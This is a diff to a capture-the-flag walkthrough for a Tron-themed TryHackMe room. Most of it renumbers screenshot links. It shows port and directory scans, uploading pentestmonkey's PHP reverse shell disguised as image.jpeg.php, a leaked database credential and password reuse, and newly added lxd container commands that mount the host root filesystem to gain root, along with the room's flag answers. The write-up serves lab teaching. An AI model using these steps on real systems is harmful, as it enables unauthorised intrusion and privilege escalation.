@@ -16,7 +16,7 @@ description: Web
 nmap -sC -sV -T5 -p1-65535 10.10.243.219
 ```
 
-![](../.gitbook/assets/image%20%28367%29.png)
+![](../.gitbook/assets/image%20%28370%29.png)
 
 {% hint style="success" %}
 80, 65000
@@ -28,13 +28,13 @@ nmap -sC -sV -T5 -p1-65535 10.10.243.219
 gobuster dir -u http://10.10.243.219 -w /usr/share/dirb/wordlists/common.txt
 ```
 
-![](../.gitbook/assets/image%20%28371%29.png)
+![](../.gitbook/assets/image%20%28374%29.png)
 
 ```text
 gobuster dir -u http://10.10.243.219:65000 -w /usr/share/dirb/wordlists/common.txt -x php -t 50
 ```
 
-![](../.gitbook/assets/image%20%28361%29.png)
+![](../.gitbook/assets/image%20%28364%29.png)
 
 ![](../.gitbook/assets/image%20%28359%29.png)
 
@@ -68,11 +68,11 @@ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/ph
 mv php-reverse-shell.php image.jpeg.php
 ```
 
-![](../.gitbook/assets/image%20%28365%29.png)
-
 ![](../.gitbook/assets/image%20%28368%29.png)
 
-![](../.gitbook/assets/image%20%28366%29.png)
+![](../.gitbook/assets/image%20%28371%29.png)
+
+![](../.gitbook/assets/image%20%28369%29.png)
 
 {% hint style="success" %}
 No answer needed
@@ -82,7 +82,7 @@ No answer needed
 
 
 
-![](../.gitbook/assets/image%20%28364%29.png)
+![](../.gitbook/assets/image%20%28367%29.png)
 
 {% hint style="success" %}
 THM{ENTER\_THE\_GRID}
@@ -110,7 +110,7 @@ cd includes
 cat dbauth.php
 ```
 
-![](../.gitbook/assets/image%20%28362%29.png)
+![](../.gitbook/assets/image%20%28365%29.png)
 
 {% hint style="success" %}
 tron:IFightForTheUsers
@@ -126,7 +126,7 @@ use tron;
 
 ```
 
-![](../.gitbook/assets/image%20%28363%29.png)
+![](../.gitbook/assets/image%20%28366%29.png)
 
 {% hint style="success" %}
 tron
@@ -136,7 +136,7 @@ tron
 
 {% embed url="https://hashes.com/en/tools/hash\_identifier" %}
 
-![](../.gitbook/assets/image%20%28369%29.png)
+![](../.gitbook/assets/image%20%28372%29.png)
 
 {% hint style="success" %}
 @computer@
@@ -144,7 +144,7 @@ tron
 
 ### Use su to login to the newly discovered user by exploiting password reuse.
 
-![](../.gitbook/assets/image%20%28372%29.png)
+![](../.gitbook/assets/image%20%28375%29.png)
 
 {% hint style="success" %}
 No naswer needed
@@ -158,13 +158,37 @@ THM{IDENTITY\_DISC\_RECOGNISED}
 
 ### Check the user's groups. Which group can be leveraged to escalate privileges?
 
-###  
+```text
+id
+group
+```
+
+![](../.gitbook/assets/image%20%28363%29.png)
+
+{% hint style="success" %}
+lxd
+{% endhint %}
 
 ### Abuse this group to escalate privileges to root.
 
+```text
+lxc image list
+lxc init Alpine strongbad -c security.privileged=true
+lxc config device add strongbad trogdor disk source=/ path=/mnt/root recursive=true
+lxc start strongbad
+lxc exec strongbad /bin/sh
 
+```
+
+![](../.gitbook/assets/image%20%28361%29.png)
+
+{% hint style="success" %}
+No answer needed
+{% endhint %}
 
 ### What is the value of the root.txt flag?
 
-
+{% hint style="success" %}
+THM{FLYNN\_LIVES}
+{% endhint %}
 
